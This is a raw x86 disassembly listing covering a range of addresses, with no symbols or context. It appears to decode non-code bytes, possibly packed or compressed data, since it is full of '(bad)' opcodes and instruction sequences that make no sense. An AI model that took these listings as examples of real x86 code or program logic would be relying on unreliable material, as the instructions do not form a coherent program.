  41be8b:	imul   edx,DWORD PTR [ecx],0xffffffda
  41be8e:	dec    edx
  41be8f:	adc    ch,BYTE PTR [edx+0x4a]
  41be92:	addr16 pop edi
  41be94:	js     0x41bf0f
  41be96:	imul   esp,DWORD PTR [ebx],0xbf4bc060
  41be9c:	lock dec DWORD PTR [eax+eiz*2+0x4d]
  41bea1:	and    eax,0x4b792422
  41bea6:	inc    edi
  41bea7:	ins    BYTE PTR es:[edi],dx
  41bea8:	popa   
  41bea9:	outs   dx,DWORD PTR ds:[esi]
  41beaa:	cwde   
  41beab:	arpl   WORD PTR [edx+0x2d],ax
  41beae:	ja     0x41bf1c
  41beb0:	mov    dl,0x52
  41beb2:	mov    edi,0x4df5bfc1
  41beb7:	pop    esp
  41beb8:	cmp    eax,0x3e08d124
  41bebd:	and    al,0x19
  41bebf:	or     al,0x34
  41bec1:	adc    eax,0x3b1a05c5
  41bec6:	cmp    al,BYTE PTR [eax]
  41bec8:	sbb    edi,DWORD PTR [ebx+eiz*8-0x1]
  41becc:	popa   
  41becd:	or     BYTE PTR ds:0x87f7e2a,dh
  41bed3:	fs sbb al,0x30
  41bed6:	add    BYTE PTR [esi+0x2b],bl
  41bed9:	xor    eax,0x4db0370c
  41bede:	dec    edx
  41bedf:	(bad)  
  41bee0:	mov    edi,0x3d0870c1
  41bee5:	adc    DWORD PTR [ebp+0x13],ebp
  41bee8:	push   esp
  41bee9:	push   ebx
  41beea:	bound  esp,QWORD PTR [eax+0x4]
  41beed:	popa   
  41beee:	jae    0x41bf43
  41bef0:	sbb    DWORD PTR [edx],ebx
  41bef2:	das    
  41bef3:	(bad)  
  41bef4:	(bad)  
  41bef5:	call   DWORD PTR [edi]
  41bef7:	sub    BYTE PTR [eax+0x50],ah
  41befa:	dec    ecx
  41befb:	jl     0x41bf4b
  41befd:	inc    ecx
  41befe:	jns    0x41bf53
  41bf00:	ins    BYTE PTR es:[edi],dx
  41bf01:	imul   esi,DWORD PTR [ebp+0x50],0x495c3776
  41bf08:	pop    ebx
  41bf09:	inc    eax
  41bf0a:	daa    
  41bf0b:	inc    ebx
  41bf0c:	push   ecx
  41bf0d:	pop    edx
  41bf0e:	pop    esi
  41bf0f:	addr16 inc ecx
  41bf11:	arpl   di,di
  41bf13:	rcl    dh,cl
  41bf15:	call   FWORD PTR [ebp+0x79]
  41bf18:	ds pusha 
  41bf1a:	cmp    ax,0x644e
  41bf1e:	xor    DWORD PTR [ebx+edx*8+0x6c],edi
  41bf22:	mov    dh,0x3e
  41bf24:	dec    edx
  41bf25:	add    BYTE PTR ds:0x97112a10,cl
  41bf2b:	(bad)  
  41bf2c:	mov    edi,0x1f3611f0
  41bf31:	pop    ss
  41bf32:	cdq    
  41bf33:	ins    DWORD PTR es:[edi],dx
  41bf34:	xor    DWORD PTR [ebx+ebx*1],edx
  41bf37:	adc    bl,BYTE PTR [ecx]
  41bf39:	pop    ss
  41bf3a:	and    DWORD PTR [ebx],esp
  41bf3c:	and    BYTE PTR [edi+0x3e],dh
  41bf3f:	cmp    eax,0xffff1323
  41bf44:	(bad)  
  41bf45:	jmp    DWORD PTR [esi+edi*1]
  41bf48:	xor    DWORD PTR [eax],ebp
  41bf4a:	jno    0x41bf72
  41bf4c:	push   es
  41bf4d:	or     BYTE PTR [eax],bh
  41bf4f:	pop    ss
  41bf50:	or     DWORD PTR [ecx+0x5b],ebp
  41bf53:	push   ecx
  41bf54:	push   edi
  41bf55:	dec    edx
  41bf56:	inc    eax
  41bf57:	jle    0x41bfac
  41bf59:	push   edi
  41bf5a:	or     eax,0x48710a41
  41bf5f:	jl     0x41bf7e
  41bf61:	bound  bx,DWORD PTR [edx+0x71]
  41bf65:	sbb    cl,BYTE PTR [ebx]
  41bf67:	cld    
  41bf68:	xchg   edi,eax
  41bf69:	(bad)  
  41bf6a:	pop    esp
  41bf6b:	jl     0x41bfd9
  41bf6d:	jne    0x41bfbb
  41bf6f:	pop    esp
  41bf70:	bound  esp,QWORD PTR [ebx]
  41bf72:	sbb    BYTE PTR [esi+0x78],cl
  41bf75:	and    eax,0x4c4e5245
  41bf7a:	mov    dl,0x66
  41bf7c:	(bad)  
  41bf7d:	idiv   BYTE PTR [edi+0x287145c1]
  41bf83:	pop    eax
  41bf84:	push   ecx
  41bf85:	ins    BYTE PTR es:[edi],dx
  41bf86:	pop    edi
  41bf87:	imul   edi,DWORD PTR [ecx],0x293a733b
  41bf8d:	fadd   QWORD PTR [edx]
  41bf8f:	and    eax,0x662bfffe
  41bf94:	sub    DWORD PTR [esi],esi
  41bf96:	pop    ss
  41bf97:	push   eax
  41bf98:	or     BYTE PTR ds:[ecx],dl
  41bf9b:	and    ebp,DWORD PTR [esp+ebp*1]
  41bf9e:	or     esi,DWORD PTR [ecx]
  41bfa0:	sub    eax,0xf1a11d26
  41bfa5:	mov    bh,0xad
  41bfa7:	int    0x1b
  41bfa9:	shl    DWORD PTR [eax],0x35
  41bfac:	adc    DWORD PTR [esi],eax
  41bfae:	jp     0x41bfe8
  41bfb0:	pop    edx
  41bfb1:	cdq    
  41bfb2:	clc    
  41bfb3:	xchg   edi,eax
  41bfb4:	(bad)  
  41bfb5:	jg     0x41bff0
  41bfb7:	ins    BYTE PTR es:[edi],dx
  41bfb8:	adc    eax,0x3b2b2115
  41bfbd:	jo     0x41bfc8
  41bfbf:	pop    esi
  41bfc0:	dec    eax
  41bfc1:	push   ebp
  41bfc2:	dec    esp
  41bfc3:	lea    edx,[eax+0x5c]
  41bfc6:	push   es
  41bfc7:	je     0x41c018
  41bfc9:	dec    esp
  41bfca:	inc    edi
  41bfcb:	mov    ds:0x33174bc4,al
  41bfd0:	add    eax,0x7a49df4b
  41bfd5:	sbb    DWORD PTR [ebp+0x5ffe05e1],esp
  41bfdb:	shr    BYTE PTR [esi+0x48],0x1a
  41bfdf:	jo     0x41c023
  41bfe1:	imul   edi,DWORD PTR [eax+ebp*2+0x64],0x6a
  41bfe6:	jle    0x41bfe6
  41bfe8:	outs   dx,BYTE PTR ds:[esi]
  41bfe9:	daa    
  41bfea:	data16 icebp 
  41bfec:	(bad)  
  41bfed:	(bad)  
  41bfee:	(bad)  
  41bfef:	jg     0x41c06f
  41bff1:	and    WORD PTR [ebx+0x42],bx
  41bff5:	aaa    
  41bff6:	dec    eax
  41bff7:	pop    esp
  41bff8:	dec    edi
  41bff9:	push   0x297f6662
  41bffe:	arpl   WORD PTR [eax+eiz*2+0x63],di
  41c002:	inc    ebp
  41c003:	push   eax
  41c004:	push   cs
  41c005:	daa    
  41c006:	or     al,0x35
  41c008:	dec    edx
  41c009:	adc    esi,DWORD PTR ds:0xf51a2a17
  41c00f:	das    
  41c010:	mov    esp,0x6e1c2bfc
  41c015:	or     al,0x15
  41c017:	arpl   WORD PTR [esi],sp
  41c019:	xor    eax,0x7b253236
  41c01e:	add    edi,DWORD PTR [ebx+0xb]
  41c021:	jp     0x41c030
  41c023:	(bad)  
  41c024:	jg     0x41c009
  41c026:	mov    edi,0x7a1d229c
  41c02b:	and    esi,DWORD PTR [esi+ecx*1]
  41c02e:	jl     0x41c03b
  41c030:	sub    BYTE PTR [eax],cl
  41c032:	jge    0x41c041
  41c034:	dec    eax
  41c035:	add    dl,BYTE PTR [ebp+0x5a]
  41c038:	jge    0x41c08f
  41c03a:	pop    es
  41c03b:	addr16 jle 0x41c05b
  41c03e:	jnp    0x41c03f
  41c040:	or     eax,0x1866fc4a
  41c045:	bound  ecx,QWORD PTR [edi+0x46]
  41c048:	add    ebx,eax
  41c04a:	sbb    dl,BYTE PTR [ebp+0x52]
  41c04d:	inc    eax
  41c04e:	inc    ebx
  41c04f:	imul   edi,DWORD PTR [edx+0x6e],0xb0285f58
  41c056:	cmc    
  41c057:	dec    ebp
  41c058:	dec    edx
  41c059:	push   edi
  41c05a:	imul   edx,esp,0x78
  41c05d:	pop    eax
  41c05e:	retf   0x6d42
  41c061:	dec    ecx
  41c062:	inc    ecx
  41c063:	lods   eax,DWORD PTR ds:[esi]
  41c064:	jmp    FWORD PTR [edi-0x1]
  41c067:	cmp    al,0x73
  41c069:	jge    0x41c0ae
  41c06b:	cmp    bh,BYTE PTR [edi]
  41c06d:	dec    eax
  41c06e:	jae    0x41c0db
  41c070:	je     0x41c0aa
  41c072:	push   eax
  41c073:	add    cl,BYTE PTR [eax]
  41c075:	xor    al,0x52
  41c077:	sub    al,0x35
  41c079:	adc    ecx,DWORD PTR [ecx]
  41c07b:	sub    al,0xab
  41c07d:	mov    edi,0x37ff4bc5
  41c082:	and    ebp,DWORD PTR [ebx+0x3e]
  41c085:	ds push ss
  41c087:	sbb    DWORD PTR [edx],esi
  41c089:	mov    DWORD PTR [edi],esi
  41c08b:	or     eax,0x65644521
  41c090:	cmp    al,0x25
  41c092:	pop    ss
  41c093:	jmp    0x153d0257
  41c098:	sub    BYTE PTR [ecx],ah
  41c09a:	or     cl,BYTE PTR [esi]
  41c09c:	loope  0x41c0c7
  41c09e:	or     DWORD PTR [eax+ecx*1+0x53],esi
  41c0a2:	ja     0x41c0ee
  41c0a4:	jae    0x41c116
  41c0a6:	les    ecx,FWORD PTR [ebp+0x727f1b85]
  41c0ac:	push   ebx
  41c0ad:	or     BYTE PTR [edi+0x79],ah
  41c0b0:	sbb    BYTE PTR [eax+ebx*2+0x1d],ah
  41c0b4:	xor    bl,BYTE PTR [edi+0x14]
  41c0b7:	xor    al,0x36
  41c0b9:	fsubp  st(0),st
  41c0bb:	dec    ebp
  41c0bc:	fs je  0x41c0c3
  41c0bf:	jl     0x41c0ec
  41c0c1:	dec    edx
  41c0c2:	xchg   DWORD PTR [ecx-0x40],edx
  41c0c5:	cld    
  41c0c6:	jg     0x41c0ab
  41c0c8:	outs   dx,DWORD PTR ds:[esi]
  41c0c9:	jmp    0x41c130
  41c0cb:	data16 and dl,BYTE PTR [ecx+0x5d]
  41c0cf:	js     0x41c052
  41c0d1:	cmp    BYTE PTR [esi+0x6a],al
  41c0d4:	pop    ebp
  41c0d5:	ds gs ds push ecx
  41c0d9:	arpl   WORD PTR [edi+0x32],sp
  41c0dc:	push   eax
  41c0dd:	inc    DWORD PTR [edx-0x73]
  41c0e0:	sbb    edi,DWORD PTR [ecx+0x8661211]
  41c0e6:	ss cmp ebp,DWORD PTR ss:[ecx+eax*1]
  41c0eb:	and    BYTE PTR [edx],bl
  41c0ed:	fld    TBYTE PTR [edi]
  41c0ef:	je     0x41c072
  41c0f1:	adc    DWORD PTR [edx+0x3220376c],ecx
  41c0f7:	cmp    bh,BYTE PTR ss:[ecx]
  41c0fa:	sub    cl,cl
  41c0fc:	add    DWORD PTR [ebx],ecx
  41c0fe:	pop    ebx
  41c0ff:	(bad)  
  41c100:	(bad)  
  41c101:	jns    0x41c115
  41c103:	adc    DWORD PTR [ebx],esi
  41c105:	cmp    al,0x7d
  41c107:	adc    eax,DWORD PTR [edi]
  41c109:	outs   dx,BYTE PTR ds:[esi]
  41c10a:	cmovne esp,DWORD PTR [edi+0x4f]
  41c10e:	dec    edx
  41c10f:	push   eax
  41c110:	dec    ebp
  41c111:	mov    WORD PTR [edx+ebx*8+0x7f],fs
  41c115:	dec    edx
  41c116:	cld    
  41c117:	mov    ebx,0x7f0572ff
  41c11c:	or     DWORD PTR [ebp+0x78],esp
  41c11f:	pop    ebx
  41c120:	dec    ebp
  41c121:	jae    0x41c0e3
  41c123:	popa   
  41c124:	dec    ecx
  41c125:	jno    0x41c175
  41c127:	adc    al,0x14
  41c129:	jo     0x41c1a3
  41c12b:	mov    edi,0xb605fffd
  41c130:	(bad)  
  41c131:	push   0x4e437702
  41c136:	bound  eax,QWORD PTR [ebx+0x7a]
  41c139:	pusha  
  41c13a:	pop    esp
  41c13b:	push   0x60
  41c13d:	inc    esp
  41c13e:	addr16 jge 0x41c1b3
  41c141:	mov    DWORD PTR ds:0x6c240b4a,eax
  41c147:	rcr    dh,0x42
  41c14a:	(bad)  
  41c14b:	fild   DWORD PTR ds:0x305f7a5e
  41c151:	cmp    al,0x69
  41c153:	add    dl,BYTE PTR [edx]
  41c155:	xor    eax,0x9b192617
  41c15a:	sub    DWORD PTR [ebx+0xb],ecx
  41c15d:	jge    0x41c100
  41c15f:	daa    
  41c160:	test   DWORD PTR ds:0x9a081d29,eax
  41c166:	cmp    DWORD PTR [eax],ebp
  41c168:	and    ebx,ebp
  41c16a:	push   ss
  41c16b:	dec    DWORD PTR [ebx-0x38]
  41c16e:	jle    0x41c176
  41c170:	jo     0x41c19a
  41c172:	sub    al,0x77
  41c174:	xor    BYTE PTR [ecx+0x34],bh
  41c177:	push   ebp
  41c178:	jno    0x41c17e
  41c17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c17b:	or     edi,esp
  41c17d:	(bad)  
  41c17e:	jg     0x41c1f3
  41c180:	pop    edx
  41c181:	add    ebp,DWORD PTR [ebp+ebx*2+0x4]
  41c185:	dec    edx
  41c186:	or     dh,BYTE PTR [edi+0x9]
  41c189:	jl     0x41c203
  41c18b:	pop    edi
  41c18c:	js     0x41c1d1
  41c18e:	jo     0x41c1d5
  41c190:	ins    DWORD PTR es:[edi],dx
  41c191:	adc    DWORD PTR [ecx+0x40],esi
  41c194:	outs   dx,DWORD PTR ds:[esi]
  41c195:	jg     0x41c192
  41c197:	push   es
  41c198:	dec    DWORD PTR [ecx+0x72]
  41c19b:	dec    dx
  41c19d:	jnp    0x41c217
  41c19f:	push   eax
  41c1a0:	arpl   WORD PTR [eax+0x20],bp
  41c1a3:	bound  eax,QWORD PTR [ecx+0x6d]
  41c1a6:	js     0x41c1d2
  41c1a8:	ds push ebp
  41c1aa:	push   0x37
  41c1ac:	inc    esi
  41c1ad:	(bad)  
  41c1ae:	(bad)  
  41c1af:	inc    DWORD PTR [edx]
  41c1b1:	sub    al,0x48
  41c1b3:	push   ecx
  41c1b4:	xor    BYTE PTR [ebx+0x34],cl
  41c1b7:	push   0x61
  41c1b9:	xor    DWORD PTR [eax],esi
  41c1bb:	inc    ebx
  41c1bc:	sub    esi,DWORD PTR [edi]
  41c1be:	push   edx
  41c1bf:	sbb    DWORD PTR [edx],edi
  41c1c1:	sbb    ebp,DWORD PTR ds:0x772e106c
  41c1c7:	push   0x7ffe056b
  41c1cc:	mov    DWORD PTR [ecx],esp
  41c1ce:	or     eax,0x2061121c
  41c1d3:	fs aaa 
  41c1d5:	xor    ch,BYTE PTR [ebx]
  41c1d7:	ja     0x41c207
  41c1d9:	or     eax,0xb7910903
  41c1de:	(bad)  
  41c1df:	(bad)  
  41c1e0:	push   DWORD PTR [ebx]
  41c1e2:	adc    DWORD PTR [edi+esi*1],esi
  41c1e5:	add    DWORD PTR [edi],ecx
  41c1e7:	sub    DWORD PTR [eax],esi
  41c1e9:	jnp    0x41c23d
  41c1eb:	pop    esp
  41c1ec:	inc    ebp
  41c1ed:	punpcklbw mm1,DWORD PTR [ecx+0x4b]
  41c1f1:	jp     0x41c239
  41c1f3:	pop    edi
  41c1f4:	jne    0x41c24f
  41c1f6:	bound  esp,QWORD PTR [edx+eax*1+0x4]
  41c1fa:	xchg   edx,eax
  41c1fb:	push   0x1e
  41c1fd:	mov    edi,0x53fe05c4
  41c202:	jge    0x41c215
  41c204:	popa   
  41c205:	ins    BYTE PTR es:[edi],dx
  41c206:	push   eax
  41c207:	bound  edx,QWORD PTR ds:0x7ef64818
  41c20d:	dec    esp
  41c20e:	push   0x4c
  41c210:	jl     0x41c211
  41c212:	outs   dx,DWORD PTR ds:[esi]
  41c213:	das    
  41c214:	lock sub BYTE PTR [edi],ah
  41c217:	dec    esp
  41c218:	and    eax,0x404264fb
  41c21d:	jmp    0x50a72b87
  41c222:	jnp    0x41c288
  41c224:	push   esi
  41c225:	jo     0x41c255
  41c227:	dec    ebp
  41c228:	inc    esp
  41c229:	sti    
  41c22a:	das    
  41c22b:	cmc    
  41c22c:	adc    ch,BYTE PTR [eax+0x52]
  41c22f:	and    esi,DWORD PTR [edi]
  41c231:	pusha  
  41c232:	xor    BYTE PTR [ecx],dh
  41c234:	sub    DWORD PTR [edi],ebp
  41c236:	aas    
  41c237:	sbb    ch,BYTE PTR [esi+0x75]
  41c23a:	cmp    edi,0x677fe25f
  41c240:	sub    al,0x66
  41c242:	popa   
  41c243:	add    al,BYTE PTR [esi]
  41c245:	add    DWORD PTR [ecx],esi
  41c247:	add    DWORD PTR [edi],esp
  41c249:	xor    bh,BYTE PTR ss:[eax+0x1]
  41c24d:	jl     0x41c27f
  41c24f:	sub    ebp,DWORD PTR [edi]
  41c251:	jbe    0x41c261
  41c253:	push   es
  41c254:	push   0xffffffff
  41c256:	inc    edx
  41c257:	dec    ebx
  41c258:	sbb    ecx,eax
  41c25a:	pop    edi
  41c25b:	xchg   ecx,eax
  41c25c:	push   esp
  41c25d:	sub    ecx,DWORD PTR [ebp+0x18]
  41c260:	inc    edx
  41c261:	jo     0x41c268
  41c263:	or     ebx,DWORD PTR [ebx-0x2]
  41c266:	jmp    FWORD PTR [ebp+0x4d6968ff]
  41c26c:	jle    0x41c2e5
  41c26e:	inc    ebp
  41c26f:	inc    ecx
  41c270:	pop    ebp
  41c271:	push   es
  41c272:	or     dl,BYTE PTR [esi]
  41c274:	sbb    eax,0x42486d56
  41c279:	outs   dx,DWORD PTR ds:[esi]
  41c27a:	inc    esi
  41c27b:	es jle 0x41c2d8
  41c27e:	push   esp
  41c27f:	and    ch,BYTE PTR [eax+0x33]
  41c282:	inc    DWORD PTR [ebp+0x62eb52e]
  41c288:	push   edx
  41c289:	popa   
  41c28a:	push   es
  41c28b:	dec    ecx
  41c28c:	ins    BYTE PTR es:[edi],dx
  41c28d:	xor    al,0x49
  41c28f:	bound  esp,QWORD PTR [ecx]
  41c291:	pop    ecx
  41c292:	dec    ecx
  41c293:	or     edi,ebp
  41c295:	add    bh,bh
  41c297:	jle    0x41c2c2
  41c299:	inc    edi
  41c29a:	das    
  41c29b:	ss gs inc ebx
  41c29e:	sub    al,0x29
  41c2a0:	das    
  41c2a1:	adc    BYTE PTR [ecx],dh
  41c2a3:	or     ebp,DWORD PTR [ebp-0x71]
  41c2a6:	sbb    ebp,DWORD PTR [eax-0x4c]
  41c2a9:	(bad)  
  41c2aa:	(bad)  
  41c2ab:	xor    al,0xb
  41c2ad:	dec    esp
  41c2ae:	outs   dx,DWORD PTR ds:[esi]
  41c2af:	push   ss
  41c2b0:	sbb    eax,0xd2f0bf3c
  41c2b5:	xchg   edi,eax
  41c2b6:	daa    
  41c2b7:	and    al,0x29
  41c2b9:	add    al,0x7d
  41c2bb:	cmp    DWORD PTR [ecx],edx
  41c2bd:	aas    
  41c2be:	sub    edi,DWORD PTR [ebx]
  41c2c0:	push   ds
  41c2c1:	comiss xmm1,DWORD PTR [edi]
  41c2c4:	and    ebp,DWORD PTR [esp+esi*2-0x1d]
  41c2c8:	rcr    BYTE PTR [ebp+0x7],cl
  41c2cb:	js     0x41c2e1
  41c2cd:	dec    esp
  41c2ce:	dec    ebp
  41c2cf:	add    eax,DWORD PTR ds:0x2fc2528a
  41c2d5:	hlt    
  41c2d6:	pop    ebx
  41c2d7:	daa    
  41c2d8:	push   ecx
  41c2d9:	pop    ebx
  41c2da:	pop    esp
  41c2db:	jge    0x41c327
  41c2dd:	mov    edx,0x71134f78
  41c2e2:	dec    esp
  41c2e3:	mov    edi,0xfa378dfe
  41c2e8:	pop    eax
  41c2e9:	dec    eax
  41c2ea:	dec    edi
  41c2eb:	pop    ebx
  41c2ec:	out    0x7f,al
  41c2ee:	pop    ecx
  41c2ef:	jo     0x41c2b5
  41c2f1:	and    al,0x7d
  41c2f3:	jg     0x41c336
  41c2f5:	and    DWORD PTR [bp+si],edi
  41c2f8:	inc    esi
  41c2fa:	outs   dx,DWORD PTR ds:[esi]
  41c2fb:	sub    eax,0x4874d119
  41c300:	push   0x3c7e3d6e
  41c305:	sub    esp,DWORD PTR [edi+0x72]
  41c308:	ss aaa 
  41c30a:	ud2    
  41c30c:	jge    0x41c309
  41c30e:	rol    BYTE PTR [ebx],cl
  41c310:	xor    ah,BYTE PTR [eax]
  41c312:	add    bl,BYTE PTR [eax]
  41c314:	push   ss
  41c315:	pop    ds
  41c316:	mov    al,ds:0xd16011f
  41c31b:	sub    eax,0xffff0b35
  41c320:	jmp    DWORD PTR [ebp+0x63]
  41c323:	push   ds
  41c324:	bound  eax,QWORD PTR [edi]
  41c326:	ds jp  0x41c329
  41c329:	sub    DWORD PTR [esi+0x7b],edi
  41c32c:	add    dh,BYTE PTR ds:0x2d282020
  41c332:	add    DWORD PTR [edx],edx
  41c334:	xor    BYTE PTR [ebx+0x77],dh
  41c337:	jg     0x41c391
  41c339:	jbe    0x41c3b7
  41c33b:	shl    dl,1
  41c33d:	aaa    
  41c33e:	sbb    al,BYTE PTR [edx-0x4]
  41c341:	pop    dx
  41c343:	jg     0x41c39b
  41c345:	or     dl,al
  41c347:	push   0xfffffffc
  41c349:	add    ch,BYTE PTR [edi+0x34]
  41c34c:	sbb    BYTE PTR [eax+0x61],ch
  41c34f:	lds    esp,FWORD PTR [ebx+0x4c]
  41c352:	inc    ebx
  41c353:	inc    esp
  41c354:	or     DWORD PTR [ebx-0x2a47a1fb],ebp
  41c35a:	or     eax,0x66314d62
  41c35f:	jo     0x41c3a5
  41c361:	inc    edi
  41c362:	and    eax,DWORD PTR ds:0x4ad4b8b6
  41c368:	jle    0x41c392
  41c36a:	dec    ecx
  41c36b:	ja     0x41c32f
  41c36d:	pop    ebp
  41c36e:	inc    ebx
  41c36f:	aam    0xff
  41c371:	call   DWORD PTR [edx-0x2f]
  41c374:	jae    0x41c3d4
  41c376:	imul   edx,DWORD PTR [edi+0x4c],0xd
  41c37a:	pop    ebp
  41c37b:	or     al,BYTE PTR [eax]
  41c37d:	cmp    BYTE PTR [ebx],al
  41c37f:	push   es
  41c380:	ss add al,0x16
  41c383:	or     DWORD PTR [ebx],ebp
  41c385:	mov    edx,0x74bf02f5
  41c38a:	xor    dl,BYTE PTR [ecx]
  41c38c:	add    ah,BYTE PTR [ecx]
  41c38e:	sbb    BYTE PTR [ebx-0x2bc79de5],al
  41c394:	ss sbb edx,eax
  41c397:	add    bh,bh
  41c399:	mov    bh,0x8
  41c39b:	sbb    al,0x2b
  41c39d:	sub    eax,0x732d271d
  41c3a2:	cmp    edx,DWORD PTR [edi]
  41c3a4:	push   0x2e
  41c3a6:	push   edi
  41c3a7:	xor    al,0xad
  41c3a9:	in     eax,dx
  41c3aa:	(bad)  
  41c3ab:	push   DWORD PTR [ebx+0x4d]
  41c3ae:	pop    esi
  41c3af:	push   ebx
  41c3b0:	pop    eax
  41c3b1:	sbb    esp,DWORD PTR [eax+0x58]
  41c3b4:	std    
  41c3b5:	sbb    ah,BYTE PTR [edi+0x7a]
  41c3b8:	sbb    DWORD PTR [ebp+0x67],0x12
  41c3bc:	(bad)  
  41c3bd:	jg     0x41c42a
  41c3bf:	xchg   ecx,eax
  41c3c0:	loope  0x41c423
  41c3c2:	jnp    0x41c3d2
  41c3c4:	inc    ebx
  41c3c5:	push   esp
  41c3c6:	sub    ecx,DWORD PTR [eax+0x53]
  41c3c9:	jno    0x41c40d
  41c3cb:	sub    BYTE PTR [ecx+0x38],al
  41c3ce:	das    
  41c3cf:	(bad)  
  41c3d0:	fnstsw ax
  41c3d2:	mov    edi,0x732d57c1
  41c3d7:	and    al,0x5c
  41c3d9:	inc    ebx
  41c3da:	dec    edi
  41c3db:	xor    ch,BYTE PTR [ecx+0x6d]
  41c3de:	gs jno 0x41c44a
  41c3e1:	pop    ebp
  41c3e2:	je     0x41c3bf
  41c3e4:	mov    eax,0x4529e8d4
  41c3e9:	sub    ah,BYTE PTR [ebx-0x4ed0a672]
  41c3ef:	add    eax,0xb76fc239
  41c3f4:	jg     0x41c427
  41c3f6:	outs   dx,DWORD PTR ds:[esi]
  41c3f7:	sub    BYTE PTR [edx+eax*1],dh
  41c3fa:	aaa    
  41c3fb:	sbb    al,BYTE PTR [edx]
  41c3fd:	pop    ds
  41c3fe:	and    al,0xff
  41c400:	js     0x41c43b
  41c402:	cmp    ah,BYTE PTR [ecx]
  41c404:	daa    
  41c405:	add    dl,BYTE PTR [edi]
  41c407:	(bad)  
  41c408:	jg     0x41c3ab
  41c40a:	stos   BYTE PTR es:[edi],al
  41c40b:	je     0x41c412
  41c40d:	sub    al,0x8
  41c40f:	jb     0x41c46f
  41c411:	dec    edi
  41c412:	pop    edx
  41c413:	pop    edx
  41c414:	jb     0x41c464
  41c416:	jno    0x41c494
  41c418:	and    BYTE PTR [ecx+0x5e],dh
  41c41b:	sbb    edi,DWORD PTR [ebp+esi*2+0x46077e89]
  41c422:	jge    0x41c42d
  41c424:	push   0x4c596e7f
  41c429:	loopne 0x41c45a
  41c42b:	lock mov bh,0x45
  41c42e:	popa   
  41c42f:	pop    ss
  41c430:	adc    eax,0x4c341862
  41c435:	loope  0x41c487
  41c437:	push   ebp
  41c438:	pop    esp
  41c439:	inc    edx
  41c43a:	daa    
  41c43b:	inc    edi
  41c43c:	inc    dh
  41c43e:	mov    bh,0x5f
  41c440:	push   ebx
  41c441:	push   edi
  41c442:	pop    edx
  41c443:	jle    0x41c49b
  41c445:	pusha  
  41c446:	xor    BYTE PTR [eax+edi*2+0x68],ah
  41c44a:	test   DWORD PTR [bx+di],esi
  41c44d:	arpl   WORD PTR [ebp+0x47],si
  41c450:	imul   ecx,DWORD PTR [ebx-0x8],0xffffffff
  41c454:	call   DWORD PTR [edi+0x52115124]
  41c45a:	or     al,0x7
  41c45c:	cs pop ss
  41c45e:	cmp    ebp,DWORD PTR [edx]
  41c460:	pop    ss
  41c461:	adc    dl,BYTE PTR [ebx]
  41c463:	sub    esp,DWORD PTR [ebx+0x3c]
  41c466:	add    BYTE PTR [edx],ah
  41c468:	cmp    al,0x1e
  41c46a:	sbb    BYTE PTR [ebx+0x38],bh
  41c46d:	sbb    bl,BYTE PTR [ecx+0x51]
  41c470:	push   DWORD PTR [edi]
  41c472:	push   ebx
  41c473:	jnp    0x41c4f0
  41c475:	push   ds
  41c476:	or     al,0x17
  41c478:	jle    0x41c485
  41c47a:	es adc al,0x5
  41c47d:	xchg   ebx,eax
  41c47e:	dec    BYTE PTR [edi+0x4d88f514]
  41c484:	test   ecx,0x3eeb09eb
  41c48a:	rcr    edi,0x1e
  41c48d:	jmp    0x41c4c0
  41c48f:	jmp    0x41c510
  41c491:	jae    0x41c488
  41c493:	or     eax,0xa90ceba0
  41c498:	mov    dl,0xbb
  41c49a:	or     ebx,DWORD PTR [ebx-0x15]
  41c49d:	inc    ebx
  41c49e:	jmp    0x41c4b7
  41c4a0:	push   ecx
  41c4a1:	adc    eax,0xebeeffff
  41c4a6:	inc    ebp
  41c4a7:	mov    ebx,DWORD PTR [edi]
  41c4a9:	addps  xmm5,xmm3
  41c4ac:	dec    edx
  41c4ad:	dec    bl
  41c4af:	jmp    0x41c4be
  41c4b1:	jne    0x41c4e6
  41c4b3:	jmp    0x41c4ed
  41c4b5:	xchg   ecx,edi
  41c4b7:	jmp    0x41c496
  41c4b9:	aad    0xb
  41c4bb:	inc    ecx
  41c4bc:	ins    BYTE PTR es:[edi],dx
  41c4bd:	push   ebp
  41c4be:	jmp    0x41c4b5
  41c4c0:	jmp    0x41c4b1
  41c4c2:	cmp    edi,0xfcdfb7dd
  41c4c8:	frstor [ecx]
  41c4ca:	jmp    0x41c4b7
  41c4cc:	xor    BYTE PTR [eax],bl
  41c4ce:	sbb    al,0x81
  41c4d0:	ret    0x202
  41c4d3:	cmp    bl,ah
  41c4d5:	mov    bl,BYTE PTR [ebp-0x9]
  41c4d8:	jmp    0x41c4c9
  41c4da:	inc    eax
  41c4db:	jmp    0x41c4ac
  41c4dd:	cli    
  41c4de:	(bad)  
  41c4e0:	in     eax,0xc1
  41c4e2:	(bad)  
  41c4e3:	es pop ecx
  41c4e5:	jmp    0x41c4ab
  41c4e7:	loop   0x41c48b
  41c4e9:	jmp    0x41c49e
  41c4eb:	push   ebx
  41c4ec:	jmp    0x41c4a6
  41c4ee:	push   ss
  41c4ef:	hlt    
  41c4f0:	btr    ecx,esi
  41c4f3:	jmp    0x41c48a
  41c4f5:	push   esp
  41c4f6:	ins    DWORD PTR es:[edi],dx
  41c4f7:	mov    ecx,0xd2e05fac
  41c4fc:	test   BYTE PTR [ecx-0x62],al
  41c4ff:	add    al,0xb1
  41c501:	inc    esp
  41c502:	call   0x572f2ada
  41c507:	ror    BYTE PTR [ebx],0xf5
  41c50a:	mov    BYTE PTR [ebp-0x11],0x43
  41c50e:	inc    ebp
  41c50f:	mov    edx,0xf726ed7c
  41c514:	jl     0x41c4bd
  41c516:	push   0x12
  41c518:	add    al,0xf4
  41c51a:	lock pop ds
  41c51c:	xchg   ebx,eax
  41c51d:	sub    bl,BYTE PTR [esi+0x22f633ea]
  41c523:	cld    
  41c524:	mov    WORD PTR [ebx],ds
  41c526:	add    al,0xa7
  41c528:	and    al,0x5d
  41c52b:	out    dx,al
  41c52c:	mov    WORD PTR [eax],gs
  41c52e:	add    ecx,edx
  41c530:	mov    edx,0x2440c38d
  41c535:	jle    0x41c57c
  41c537:	mov    esp,0x858a0750
  41c53c:	mov    dl,BYTE PTR [edx+eax*1+0x2a]
  41c540:	cli    
  41c541:	das    
  41c542:	mov    ch,0x1a
  41c544:	cld    
  41c545:	jno    0x41c560
  41c547:	jne    0x41c54e
  41c549:	mov    esi,eax
  41c54b:	dec    esi
  41c54c:	jmp    0x41c554
  41c54e:	stos   BYTE PTR es:[edi],al
  41c54f:	add    eax,0x41833788
  41c554:	jne    0x41c53c
  41c556:	fcomp  DWORD PTR [edx-0x53]
